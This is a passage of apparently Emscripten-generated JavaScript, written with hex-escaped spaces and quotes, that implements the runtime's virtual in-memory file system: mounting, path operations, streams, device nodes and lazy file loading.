FS.streams[fd]=stream;return\x20stream}),closeStream:(function(fd){FS.streams[fd]=null}),chrdev_stream_ops:{open:(function(stream){var\x20device=FS.getDevice(stream.node.rdev);stream.stream_ops=device.stream_ops;if(stream.stream_ops.open){stream.stream_ops.open(stream)}}),llseek:(function(){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ESPIPE)})},major:(function(dev){return\x20dev>>8}),minor:(function(dev){return\x20dev&255}),makedev:(function(ma,mi){return\x20ma<<8|mi}),registerDevice:(function(dev,ops){FS.devices[dev]={stream_ops:ops}}),getDevice:(function(dev){return\x20FS.devices[dev]}),getMounts:(function(mount){var\x20mounts=[];var\x20check=[mount];while(check.length){var\x20m=check.pop();mounts.push(m);check.push.apply(check,m.mounts)}return\x20mounts}),syncfs:(function(populate,callback){if(typeof\x20populate===\x22function\x22){callback=populate;populate=false}FS.syncFSRequests++;if(FS.syncFSRequests>1){console.log(\x22warning:\x20\x22+FS.syncFSRequests+\x22\x20FS.syncfs\x20operations\x20in\x20flight\x20at\x20once,\x20probably\x20just\x20doing\x20extra\x20work\x22)}var\x20mounts=FS.getMounts(FS.root.mount);var\x20completed=0;function\x20doCallback(err){assert(FS.syncFSRequests>0);FS.syncFSRequests--;return\x20callback(err)}function\x20done(err){if(err){if(!done.errored){done.errored=true;return\x20doCallback(err)}return}if(++completed>=mounts.length){doCallback(null)}}mounts.forEach((function(mount){if(!mount.type.syncfs){return\x20done(null)}mount.type.syncfs(mount,populate,done)}))}),mount:(function(type,opts,mountpoint){var\x20root=mountpoint===\x22/\x22;var\x20pseudo=!mountpoint;var\x20node;if(root&&FS.root){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBUSY)}else\x20if(!root&&!pseudo){var\x20lookup=FS.lookupPath(mountpoint,{follow_mount:false});mountpoint=lookup.path;node=lookup.node;if(FS.isMountpoint(node)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBUSY)}if(!FS.isDir(node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTDIR)}}var\x20mount={type:type,opts:opts,mountpoint:mountpoint,mounts:[]};var\x20mountRoot=type.mount(mount);mountRoot.mount=mount;mount.root=mountRoot;if(root){FS.root=mountRoot}else\x20if(node){node.mounted=mount;if(node.mount){node.mount.mounts.push(mount)}}return\x20mountRoot}),unmount:(function(mountpoint){var\x20lookup=FS.lookupPath(mountpoint,{follow_mount:false});if(!FS.isMountpoint(lookup.node)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}var\x20node=lookup.node;var\x20mount=node.mounted;var\x20mounts=FS.getMounts(mount);Object.keys(FS.nameTable).forEach((function(hash){var\x20current=FS.nameTable[hash];while(current){var\x20next=current.name_next;if(mounts.indexOf(current.mount)!==-1){FS.destroyNode(current)}current=next}}));node.mounted=null;var\x20idx=node.mount.mounts.indexOf(mount);assert(idx!==-1);node.mount.mounts.splice(idx,1)}),lookup:(function(parent,name){return\x20parent.node_ops.lookup(parent,name)}),mknod:(function(path,mode,dev){var\x20lookup=FS.lookupPath(path,{parent:true});var\x20parent=lookup.node;var\x20name=PATH.basename(path);if(!name||name===\x22.\x22||name===\x22..\x22){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}var\x20err=FS.mayCreate(parent,name);if(err){throw\x20new\x20FS.ErrnoError(err)}if(!parent.node_ops.mknod){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}return\x20parent.node_ops.mknod(parent,name,mode,dev)}),create:(function(path,mode){mode=mode!==undefined?mode:438;mode&=4095;mode|=32768;return\x20FS.mknod(path,mode,0)}),mkdir:(function(path,mode){mode=mode!==undefined?mode:511;mode&=511|512;mode|=16384;return\x20FS.mknod(path,mode,0)}),mkdirTree:(function(path,mode){var\x20dirs=path.split(\x22/\x22);var\x20d=\x22\x22;for(var\x20i=0;i<dirs.length;++i){if(!dirs[i])continue;d+=\x22/\x22+dirs[i];try{FS.mkdir(d,mode)}catch(e){if(e.errno!=ERRNO_CODES.EEXIST)throw\x20e}}}),mkdev:(function(path,mode,dev){if(typeof\x20dev===\x22undefined\x22){dev=mode;mode=438}mode|=8192;return\x20FS.mknod(path,mode,dev)}),symlink:(function(oldpath,newpath){if(!PATH.resolve(oldpath)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}var\x20lookup=FS.lookupPath(newpath,{parent:true});var\x20parent=lookup.node;if(!parent){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}var\x20newname=PATH.basename(newpath);var\x20err=FS.mayCreate(parent,newname);if(err){throw\x20new\x20FS.ErrnoError(err)}if(!parent.node_ops.symlink){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}return\x20parent.node_ops.symlink(parent,newname,oldpath)}),rename:(function(old_path,new_path){var\x20old_dirname=PATH.dirname(old_path);var\x20new_dirname=PATH.dirname(new_path);var\x20old_name=PATH.basename(old_path);var\x20new_name=PATH.basename(new_path);var\x20lookup,old_dir,new_dir;try{lookup=FS.lookupPath(old_path,{parent:true});old_dir=lookup.node;lookup=FS.lookupPath(new_path,{parent:true});new_dir=lookup.node}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBUSY)}if(!old_dir||!new_dir)throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT);if(old_dir.mount!==new_dir.mount){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EXDEV)}var\x20old_node=FS.lookupNode(old_dir,old_name);var\x20relative=PATH.relative(old_path,new_dirname);if(relative.charAt(0)!==\x22.\x22){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}relative=PATH.relative(new_path,old_dirname);if(relative.charAt(0)!==\x22.\x22){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)}var\x20new_node;try{new_node=FS.lookupNode(new_dir,new_name)}catch(e){}if(old_node===new_node){return}var\x20isdir=FS.isDir(old_node.mode);var\x20err=FS.mayDelete(old_dir,old_name,isdir);if(err){throw\x20new\x20FS.ErrnoError(err)}err=new_node?FS.mayDelete(new_dir,new_name,isdir):FS.mayCreate(new_dir,new_name);if(err){throw\x20new\x20FS.ErrnoError(err)}if(!old_dir.node_ops.rename){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}if(FS.isMountpoint(old_node)||new_node&&FS.isMountpoint(new_node)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBUSY)}if(new_dir!==old_dir){err=FS.nodePermissions(old_dir,\x22w\x22);if(err){throw\x20new\x20FS.ErrnoError(err)}}try{if(FS.trackingDelegate[\x22willMovePath\x22]){FS.trackingDelegate[\x22willMovePath\x22](old_path,new_path)}}catch(e){console.log(\x22FS.trackingDelegate[\x27willMovePath\x27](\x27\x22+old_path+\x22\x27,\x20\x27\x22+new_path+\x22\x27)\x20threw\x20an\x20exception:\x20\x22+e.message)}FS.hashRemoveNode(old_node);try{old_dir.node_ops.rename(old_node,new_dir,new_name)}catch(e){throw\x20e}finally{FS.hashAddNode(old_node)}try{if(FS.trackingDelegate[\x22onMovePath\x22])FS.trackingDelegate[\x22onMovePath\x22](old_path,new_path)}catch(e){console.log(\x22FS.trackingDelegate[\x27onMovePath\x27](\x27\x22+old_path+\x22\x27,\x20\x27\x22+new_path+\x22\x27)\x20threw\x20an\x20exception:\x20\x22+e.message)}}),rmdir:(function(path){var\x20lookup=FS.lookupPath(path,{parent:true});var\x20parent=lookup.node;var\x20name=PATH.basename(path);var\x20node=FS.lookupNode(parent,name);var\x20err=FS.mayDelete(parent,name,true);if(err){throw\x20new\x20FS.ErrnoError(err)}if(!parent.node_ops.rmdir){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}if(FS.isMountpoint(node)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBUSY)}try{if(FS.trackingDelegate[\x22willDeletePath\x22]){FS.trackingDelegate[\x22willDeletePath\x22](path)}}catch(e){console.log(\x22FS.trackingDelegate[\x27willDeletePath\x27](\x27\x22+path+\x22\x27)\x20threw\x20an\x20exception:\x20\x22+e.message)}parent.node_ops.rmdir(parent,name);FS.destroyNode(node);try{if(FS.trackingDelegate[\x22onDeletePath\x22])FS.trackingDelegate[\x22onDeletePath\x22](path)}catch(e){console.log(\x22FS.trackingDelegate[\x27onDeletePath\x27](\x27\x22+path+\x22\x27)\x20threw\x20an\x20exception:\x20\x22+e.message)}}),readdir:(function(path){var\x20lookup=FS.lookupPath(path,{follow:true});var\x20node=lookup.node;if(!node.node_ops.readdir){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTDIR)}return\x20node.node_ops.readdir(node)}),unlink:(function(path){var\x20lookup=FS.lookupPath(path,{parent:true});var\x20parent=lookup.node;var\x20name=PATH.basename(path);var\x20node=FS.lookupNode(parent,name);var\x20err=FS.mayDelete(parent,name,false);if(err){throw\x20new\x20FS.ErrnoError(err)}if(!parent.node_ops.unlink){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}if(FS.isMountpoint(node)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBUSY)}try{if(FS.trackingDelegate[\x22willDeletePath\x22]){FS.trackingDelegate[\x22willDeletePath\x22](path)}}catch(e){console.log(\x22FS.trackingDelegate[\x27willDeletePath\x27](\x27\x22+path+\x22\x27)\x20threw\x20an\x20exception:\x20\x22+e.message)}parent.node_ops.unlink(parent,name);FS.destroyNode(node);try{if(FS.trackingDelegate[\x22onDeletePath\x22])FS.trackingDelegate[\x22onDeletePath\x22](path)}catch(e){console.log(\x22FS.trackingDelegate[\x27onDeletePath\x27](\x27\x22+path+\x22\x27)\x20threw\x20an\x20exception:\x20\x22+e.message)}}),readlink:(function(path){var\x20lookup=FS.lookupPath(path);var\x20link=lookup.node;if(!link){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}if(!link.node_ops.readlink){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}return\x20PATH.resolve(FS.getPath(link.parent),link.node_ops.readlink(link))}),stat:(function(path,dontFollow){var\x20lookup=FS.lookupPath(path,{follow:!dontFollow});var\x20node=lookup.node;if(!node){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}if(!node.node_ops.getattr){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}return\x20node.node_ops.getattr(node)}),lstat:(function(path){return\x20FS.stat(path,true)}),chmod:(function(path,mode,dontFollow){var\x20node;if(typeof\x20path===\x22string\x22){var\x20lookup=FS.lookupPath(path,{follow:!dontFollow});node=lookup.node}else{node=path}if(!node.node_ops.setattr){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}node.node_ops.setattr(node,{mode:mode&4095|node.mode&~4095,timestamp:Date.now()})}),lchmod:(function(path,mode){FS.chmod(path,mode,true)}),fchmod:(function(fd,mode){var\x20stream=FS.getStream(fd);if(!stream){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF)}FS.chmod(stream.node,mode)}),chown:(function(path,uid,gid,dontFollow){var\x20node;if(typeof\x20path===\x22string\x22){var\x20lookup=FS.lookupPath(path,{follow:!dontFollow});node=lookup.node}else{node=path}if(!node.node_ops.setattr){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}node.node_ops.setattr(node,{timestamp:Date.now()})}),lchown:(function(path,uid,gid){FS.chown(path,uid,gid,true)}),fchown:(function(fd,uid,gid){var\x20stream=FS.getStream(fd);if(!stream){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF)}FS.chown(stream.node,uid,gid)}),truncate:(function(path,len){if(len<0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}var\x20node;if(typeof\x20path===\x22string\x22){var\x20lookup=FS.lookupPath(path,{follow:true});node=lookup.node}else{node=path}if(!node.node_ops.setattr){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}if(FS.isDir(node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EISDIR)}if(!FS.isFile(node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}var\x20err=FS.nodePermissions(node,\x22w\x22);if(err){throw\x20new\x20FS.ErrnoError(err)}node.node_ops.setattr(node,{size:len,timestamp:Date.now()})}),ftruncate:(function(fd,len){var\x20stream=FS.getStream(fd);if(!stream){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF)}if((stream.flags&2097155)===0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}FS.truncate(stream.node,len)}),utime:(function(path,atime,mtime){var\x20lookup=FS.lookupPath(path,{follow:true});var\x20node=lookup.node;node.node_ops.setattr(node,{timestamp:Math.max(atime,mtime)})}),open:(function(path,flags,mode,fd_start,fd_end){if(path===\x22\x22){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}flags=typeof\x20flags===\x22string\x22?FS.modeStringToFlags(flags):flags;mode=typeof\x20mode===\x22undefined\x22?438:mode;if(flags&64){mode=mode&4095|32768}else{mode=0}var\x20node;if(typeof\x20path===\x22object\x22){node=path}else{path=PATH.normalize(path);try{var\x20lookup=FS.lookupPath(path,{follow:!(flags&131072)});node=lookup.node}catch(e){}}var\x20created=false;if(flags&64){if(node){if(flags&128){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EEXIST)}}else{node=FS.mknod(path,mode,0);created=true}}if(!node){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}if(FS.isChrdev(node.mode)){flags&=~512}if(flags&65536&&!FS.isDir(node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTDIR)}if(!created){var\x20err=FS.mayOpen(node,flags);if(err){throw\x20new\x20FS.ErrnoError(err)}}if(flags&512){FS.truncate(node,0)}flags&=~(128|512);var\x20stream=FS.createStream({node:node,path:FS.getPath(node),flags:flags,seekable:true,position:0,stream_ops:node.stream_ops,ungotten:[],error:false},fd_start,fd_end);if(stream.stream_ops.open){stream.stream_ops.open(stream)}if(Module[\x22logReadFiles\x22]&&!(flags&1)){if(!FS.readFiles)FS.readFiles={};if(!(path\x20in\x20FS.readFiles)){FS.readFiles[path]=1;Module[\x22printErr\x22](\x22read\x20file:\x20\x22+path)}}try{if(FS.trackingDelegate[\x22onOpenFile\x22]){var\x20trackingFlags=0;if((flags&2097155)!==1){trackingFlags|=FS.tracking.openFlags.READ}if((flags&2097155)!==0){trackingFlags|=FS.tracking.openFlags.WRITE}FS.trackingDelegate[\x22onOpenFile\x22](path,trackingFlags)}}catch(e){console.log(\x22FS.trackingDelegate[\x27onOpenFile\x27](\x27\x22+path+\x22\x27,\x20flags)\x20threw\x20an\x20exception:\x20\x22+e.message)}return\x20stream}),close:(function(stream){if(stream.getdents)stream.getdents=null;try{if(stream.stream_ops.close){stream.stream_ops.close(stream)}}catch(e){throw\x20e}finally{FS.closeStream(stream.fd)}}),llseek:(function(stream,offset,whence){if(!stream.seekable||!stream.stream_ops.llseek){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ESPIPE)}stream.position=stream.stream_ops.llseek(stream,offset,whence);stream.ungotten=[];return\x20stream.position}),read:(function(stream,buffer,offset,length,position){if(length<0||position<0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}if((stream.flags&2097155)===1){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF)}if(FS.isDir(stream.node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EISDIR)}if(!stream.stream_ops.read){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}var\x20seeking=true;if(typeof\x20position===\x22undefined\x22){position=stream.position;seeking=false}else\x20if(!stream.seekable){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ESPIPE)}var\x20bytesRead=stream.stream_ops.read(stream,buffer,offset,length,position);if(!seeking)stream.position+=bytesRead;return\x20bytesRead}),write:(function(stream,buffer,offset,length,position,canOwn){if(length<0||position<0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}if((stream.flags&2097155)===0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF)}if(FS.isDir(stream.node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EISDIR)}if(!stream.stream_ops.write){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}if(stream.flags&1024){FS.llseek(stream,0,2)}var\x20seeking=true;if(typeof\x20position===\x22undefined\x22){position=stream.position;seeking=false}else\x20if(!stream.seekable){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ESPIPE)}var\x20bytesWritten=stream.stream_ops.write(stream,buffer,offset,length,position,canOwn);if(!seeking)stream.position+=bytesWritten;try{if(stream.path&&FS.trackingDelegate[\x22onWriteToFile\x22])FS.trackingDelegate[\x22onWriteToFile\x22](stream.path)}catch(e){console.log(\x22FS.trackingDelegate[\x27onWriteToFile\x27](\x27\x22+path+\x22\x27)\x20threw\x20an\x20exception:\x20\x22+e.message)}return\x20bytesWritten}),allocate:(function(stream,offset,length){if(offset<0||length<=0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}if((stream.flags&2097155)===0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF)}if(!FS.isFile(stream.node.mode)&&!FS.isDir(stream.node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENODEV)}if(!stream.stream_ops.allocate){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EOPNOTSUPP)}stream.stream_ops.allocate(stream,offset,length)}),mmap:(function(stream,buffer,offset,length,position,prot,flags){if((stream.flags&2097155)===1){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EACCES)}if(!stream.stream_ops.mmap){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENODEV)}return\x20stream.stream_ops.mmap(stream,buffer,offset,length,position,prot,flags)}),msync:(function(stream,buffer,offset,length,mmapFlags){if(!stream||!stream.stream_ops.msync){return\x200}return\x20stream.stream_ops.msync(stream,buffer,offset,length,mmapFlags)}),munmap:(function(stream){return\x200}),ioctl:(function(stream,cmd,arg){if(!stream.stream_ops.ioctl){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTTY)}return\x20stream.stream_ops.ioctl(stream,cmd,arg)}),readFile:(function(path,opts){opts=opts||{};opts.flags=opts.flags||\x22r\x22;opts.encoding=opts.encoding||\x22binary\x22;if(opts.encoding!==\x22utf8\x22&&opts.encoding!==\x22binary\x22){throw\x20new\x20Error(\x27Invalid\x20encoding\x20type\x20\x22\x27+opts.encoding+\x27\x22\x27)}var\x20ret;var\x20stream=FS.open(path,opts.flags);var\x20stat=FS.stat(path);var\x20length=stat.size;var\x20buf=new\x20Uint8Array(length);FS.read(stream,buf,0,length,0);if(opts.encoding===\x22utf8\x22){ret=UTF8ArrayToString(buf,0)}else\x20if(opts.encoding===\x22binary\x22){ret=buf}FS.close(stream);return\x20ret}),writeFile:(function(path,data,opts){opts=opts||{};opts.flags=opts.flags||\x22w\x22;opts.encoding=opts.encoding||\x22utf8\x22;if(opts.encoding!==\x22utf8\x22&&opts.encoding!==\x22binary\x22){throw\x20new\x20Error(\x27Invalid\x20encoding\x20type\x20\x22\x27+opts.encoding+\x27\x22\x27)}var\x20stream=FS.open(path,opts.flags,opts.mode);if(opts.encoding===\x22utf8\x22){var\x20buf=new\x20Uint8Array(lengthBytesUTF8(data)+1);var\x20actualNumBytes=stringToUTF8Array(data,buf,0,buf.length);FS.write(stream,buf,0,actualNumBytes,0,opts.canOwn)}else\x20if(opts.encoding===\x22binary\x22){FS.write(stream,data,0,data.length,0,opts.canOwn)}FS.close(stream)}),cwd:(function(){return\x20FS.currentPath}),chdir:(function(path){var\x20lookup=FS.lookupPath(path,{follow:true});if(lookup.node===null){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}if(!FS.isDir(lookup.node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTDIR)}var\x20err=FS.nodePermissions(lookup.node,\x22x\x22);if(err){throw\x20new\x20FS.ErrnoError(err)}FS.currentPath=lookup.path}),createDefaultDirectories:(function(){FS.mkdir(\x22/tmp\x22);FS.mkdir(\x22/home\x22);FS.mkdir(\x22/home/web_user\x22)}),createDefaultDevices:(function(){FS.mkdir(\x22/dev\x22);FS.registerDevice(FS.makedev(1,3),{read:(function(){return\x200}),write:(function(stream,buffer,offset,length,pos){return\x20length})});FS.mkdev(\x22/dev/null\x22,FS.makedev(1,3));TTY.register(FS.makedev(5,0),TTY.default_tty_ops);TTY.register(FS.makedev(6,0),TTY.default_tty1_ops);FS.mkdev(\x22/dev/tty\x22,FS.makedev(5,0));FS.mkdev(\x22/dev/tty1\x22,FS.makedev(6,0));var\x20random_device;if(typeof\x20crypto!==\x22undefined\x22){var\x20randomBuffer=new\x20Uint8Array(1);random_device=(function(){crypto.getRandomValues(randomBuffer);return\x20randomBuffer[0]})}else\x20if(ENVIRONMENT_IS_NODE){random_device=(function(){return\x20require(\x22crypto\x22).randomBytes(1)[0]})}else{random_device=(function(){return\x20Math.random()*256|0})}FS.createDevice(\x22/dev\x22,\x22random\x22,random_device);FS.createDevice(\x22/dev\x22,\x22urandom\x22,random_device);FS.mkdir(\x22/dev/shm\x22);FS.mkdir(\x22/dev/shm/tmp\x22)}),createSpecialDirectories:(function(){FS.mkdir(\x22/proc\x22);FS.mkdir(\x22/proc/self\x22);FS.mkdir(\x22/proc/self/fd\x22);FS.mount({mount:(function(){var\x20node=FS.createNode(\x22/proc/self\x22,\x22fd\x22,16384|511,73);node.node_ops={lookup:(function(parent,name){var\x20fd=+name;var\x20stream=FS.getStream(fd);if(!stream)throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF);var\x20ret={parent:null,mount:{mountpoint:\x22fake\x22},node_ops:{readlink:(function(){return\x20stream.path})}};ret.parent=ret;return\x20ret})};return\x20node})},{},\x22/proc/self/fd\x22)}),createStandardStreams:(function(){if(Module[\x22stdin\x22]){FS.createDevice(\x22/dev\x22,\x22stdin\x22,Module[\x22stdin\x22])}else{FS.symlink(\x22/dev/tty\x22,\x22/dev/stdin\x22)}if(Module[\x22stdout\x22]){FS.createDevice(\x22/dev\x22,\x22stdout\x22,null,Module[\x22stdout\x22])}else{FS.symlink(\x22/dev/tty\x22,\x22/dev/stdout\x22)}if(Module[\x22stderr\x22]){FS.createDevice(\x22/dev\x22,\x22stderr\x22,null,Module[\x22stderr\x22])}else{FS.symlink(\x22/dev/tty1\x22,\x22/dev/stderr\x22)}var\x20stdin=FS.open(\x22/dev/stdin\x22,\x22r\x22);assert(stdin.fd===0,\x22invalid\x20handle\x20for\x20stdin\x20(\x22+stdin.fd+\x22)\x22);var\x20stdout=FS.open(\x22/dev/stdout\x22,\x22w\x22);assert(stdout.fd===1,\x22invalid\x20handle\x20for\x20stdout\x20(\x22+stdout.fd+\x22)\x22);var\x20stderr=FS.open(\x22/dev/stderr\x22,\x22w\x22);assert(stderr.fd===2,\x22invalid\x20handle\x20for\x20stderr\x20(\x22+stderr.fd+\x22)\x22)}),ensureErrnoError:(function(){if(FS.ErrnoError)return;FS.ErrnoError=function\x20ErrnoError(errno,node){this.node=node;this.setErrno=(function(errno){this.errno=errno;for(var\x20key\x20in\x20ERRNO_CODES){if(ERRNO_CODES[key]===errno){this.code=key;break}}});this.setErrno(errno);this.message=ERRNO_MESSAGES[errno]};FS.ErrnoError.prototype=new\x20Error;FS.ErrnoError.prototype.constructor=FS.ErrnoError;[ERRNO_CODES.ENOENT].forEach((function(code){FS.genericErrors[code]=new\x20FS.ErrnoError(code);FS.genericErrors[code].stack=\x22<generic\x20error,\x20no\x20stack>\x22}))}),staticInit:(function(){FS.ensureErrnoError();FS.nameTable=new\x20Array(4096);FS.mount(MEMFS,{},\x22/\x22);FS.createDefaultDirectories();FS.createDefaultDevices();FS.createSpecialDirectories();FS.filesystems={\x22MEMFS\x22:MEMFS,\x22IDBFS\x22:IDBFS,\x22NODEFS\x22:NODEFS,\x22WORKERFS\x22:WORKERFS}}),init:(function(input,output,error){assert(!FS.init.initialized,\x22FS.init\x20was\x20previously\x20called.\x20If\x20you\x20want\x20to\x20initialize\x20later\x20with\x20custom\x20parameters,\x20remove\x20any\x20earlier\x20calls\x20(note\x20that\x20one\x20is\x20automatically\x20added\x20to\x20the\x20generated\x20code)\x22);FS.init.initialized=true;FS.ensureErrnoError();Module[\x22stdin\x22]=input||Module[\x22stdin\x22];Module[\x22stdout\x22]=output||Module[\x22stdout\x22];Module[\x22stderr\x22]=error||Module[\x22stderr\x22];FS.createStandardStreams()}),quit:(function(){FS.init.initialized=false;var\x20fflush=Module[\x22_fflush\x22];if(fflush)fflush(0);for(var\x20i=0;i<FS.streams.length;i++){var\x20stream=FS.streams[i];if(!stream){continue}FS.close(stream)}}),getMode:(function(canRead,canWrite){var\x20mode=0;if(canRead)mode|=292|73;if(canWrite)mode|=146;return\x20mode}),joinPath:(function(parts,forceRelative){var\x20path=PATH.join.apply(null,parts);if(forceRelative&&path[0]==\x22/\x22)path=path.substr(1);return\x20path}),absolutePath:(function(relative,base){return\x20PATH.resolve(base,relative)}),standardizePath:(function(path){return\x20PATH.normalize(path)}),findObject:(function(path,dontResolveLastLink){var\x20ret=FS.analyzePath(path,dontResolveLastLink);if(ret.exists){return\x20ret.object}else{___setErrNo(ret.error);return\x20null}}),analyzePath:(function(path,dontResolveLastLink){try{var\x20lookup=FS.lookupPath(path,{follow:!dontResolveLastLink});path=lookup.path}catch(e){}var\x20ret={isRoot:false,exists:false,error:0,name:null,path:null,object:null,parentExists:false,parentPath:null,parentObject:null};try{var\x20lookup=FS.lookupPath(path,{parent:true});ret.parentExists=true;ret.parentPath=lookup.path;ret.parentObject=lookup.node;ret.name=PATH.basename(path);lookup=FS.lookupPath(path,{follow:!dontResolveLastLink});ret.exists=true;ret.path=lookup.path;ret.object=lookup.node;ret.name=lookup.node.name;ret.isRoot=lookup.path===\x22/\x22}catch(e){ret.error=e.errno}return\x20ret}),createFolder:(function(parent,name,canRead,canWrite){var\x20path=PATH.join2(typeof\x20parent===\x22string\x22?parent:FS.getPath(parent),name);var\x20mode=FS.getMode(canRead,canWrite);return\x20FS.mkdir(path,mode)}),createPath:(function(parent,path,canRead,canWrite){parent=typeof\x20parent===\x22string\x22?parent:FS.getPath(parent);var\x20parts=path.split(\x22/\x22).reverse();while(parts.length){var\x20part=parts.pop();if(!part)continue;var\x20current=PATH.join2(parent,part);try{FS.mkdir(current)}catch(e){}parent=current}return\x20current}),createFile:(function(parent,name,properties,canRead,canWrite){var\x20path=PATH.join2(typeof\x20parent===\x22string\x22?parent:FS.getPath(parent),name);var\x20mode=FS.getMode(canRead,canWrite);return\x20FS.create(path,mode)}),createDataFile:(function(parent,name,data,canRead,canWrite,canOwn){var\x20path=name?PATH.join2(typeof\x20parent===\x22string\x22?parent:FS.getPath(parent),name):parent;var\x20mode=FS.getMode(canRead,canWrite);var\x20node=FS.create(path,mode);if(data){if(typeof\x20data===\x22string\x22){var\x20arr=new\x20Array(data.length);for(var\x20i=0,len=data.length;i<len;++i)arr[i]=data.charCodeAt(i);data=arr}FS.chmod(node,mode|146);var\x20stream=FS.open(node,\x22w\x22);FS.write(stream,data,0,data.length,0,canOwn);FS.close(stream);FS.chmod(node,mode)}return\x20node}),createDevice:(function(parent,name,input,output){var\x20path=PATH.join2(typeof\x20parent===\x22string\x22?parent:FS.getPath(parent),name);var\x20mode=FS.getMode(!!input,!!output);if(!FS.createDevice.major)FS.createDevice.major=64;var\x20dev=FS.makedev(FS.createDevice.major++,0);FS.registerDevice(dev,{open:(function(stream){stream.seekable=false}),close:(function(stream){if(output&&output.buffer&&output.buffer.length){output(10)}}),read:(function(stream,buffer,offset,length,pos){var\x20bytesRead=0;for(var\x20i=0;i<length;i++){var\x20result;try{result=input()}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EIO)}if(result===undefined&&bytesRead===0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EAGAIN)}if(result===null||result===undefined)break;bytesRead++;buffer[offset+i]=result}if(bytesRead){stream.node.timestamp=Date.now()}return\x20bytesRead}),write:(function(stream,buffer,offset,length,pos){for(var\x20i=0;i<length;i++){try{output(buffer[offset+i])}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EIO)}}if(length){stream.node.timestamp=Date.now()}return\x20i})});return\x20FS.mkdev(path,mode,dev)}),createLink:(function(parent,name,target,canRead,canWrite){var\x20path=PATH.join2(typeof\x20parent===\x22string\x22?parent:FS.getPath(parent),name);return\x20FS.symlink(target,path)}),forceLoadFile:(function(obj){if(obj.isDevice||obj.isFolder||obj.link||obj.contents)return\x20true;var\x20success=true;if(typeof\x20XMLHttpRequest!==\x22undefined\x22){throw\x20new\x20Error(\x22Lazy\x20loading\x20should\x20have\x20been\x20performed\x20(contents\x20set)\x20in\x20createLazyFile,\x20but\x20it\x20was\x20not.\x20Lazy\x20loading\x20only\x20works\x20in\x20web\x20workers.\x20Use\x20--embed-file\x20or\x20--preload-file\x20in\x20emcc\x20on\x20the\x20main\x20thread.\x22)}else\x20if(Module[\x22read\x22]){try{obj.contents=intArrayFromString(Module[\x22read\x22](obj.url),true);obj.usedBytes=obj.contents.length}catch(e){success=false}}else{throw\x20new\x20Error(\x22Cannot\x20load\x20without\x20read()\x20or\x20XMLHttpRequest.\x22)}if(!success)___setErrNo(ERRNO_CODES.EIO);return\x20success}),createLazyFile:(function(parent,name,url,canRead,canWrite){function\x20LazyUint8Array(){this.lengthKnown=false;this.chunks=[]}LazyUint8Array.prototype.get=function\x20LazyUint8Array_get(idx){if(idx>this.length-1||idx<0){return\x20undefined}var\x